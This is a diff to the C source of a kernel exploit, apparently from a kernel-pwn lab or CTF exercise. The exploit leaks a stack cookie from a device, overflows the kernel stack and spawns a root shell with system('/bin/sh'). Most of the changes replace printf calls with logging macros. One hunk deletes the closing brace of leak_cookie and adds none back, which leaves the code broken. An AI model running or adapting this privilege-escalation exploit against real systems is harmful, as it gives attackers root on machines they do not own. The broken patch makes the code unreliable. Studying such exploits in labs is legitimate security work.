@@ -1,3 +1,4 @@
+#include "include/xpl_utils.h"
 #define _GNU_SOURCE
 #include <stdio.h>
 #include <stdlib.h>
@@ -27,7 +28,7 @@ int main(void)
 
 
     close(fd);
-    printf("[+] Done\n");
+    printf("[✓] Done\n");
     return 0;
 }
 
@@ -55,12 +56,14 @@ uintptr_t leak_cookie(int fd, size_t leak_slots, size_t cookie_offset)
     if (nread < 0)
         DIE("read");
 
+	hexdump("Leaks", leaks, leak_slots * sizeof(uintptr_t));
+
     uintptr_t cookie = leaks[cookie_offset / sizeof(uintptr_t)];
-    printf("[*] Cookie: 0x%lx\n", (unsigned long)cookie);
+	SUCCESS("Read %d (0x%x) bytes from device; cookie = 0x%lx @ offset 0x%x (slot #%zu)",
+			nread, nread, (unsigned long)cookie, cookie_offset, cookie_offset / sizeof(uintptr_t));
 
     free(leaks);
     return cookie;
-}
 
 /* Kernel stack overflow */
 void stack_overflow(int fd, uintptr_t cookie, uintptr_t ret_addr,
@@ -95,17 +98,18 @@ void stack_overflow(int fd, uintptr_t cookie, uintptr_t ret_addr,
     if (written < 0)
         DIE("write");
 
-    printf("[!] %zd bytes of payload written\n", written);
+    SUCCESS("[!] %zd bytes of payload written\n", written);
     free(pl);
 }
 
 /* Rooted */
-void spawn_shell(void) {
+void spawn_shell(void)
+{
     if (getuid() == 0) {
-        printf("[+] GOT ROOT SHELL!\n");
+		SUCCESS("GOT ROOT SHELL!");
         system("/bin/sh");
     } else {
-        fprintf(stderr, "[-] Failed to escalate\n");
+		FAILURE("Privesc failed");
         exit(1);
     }
 }
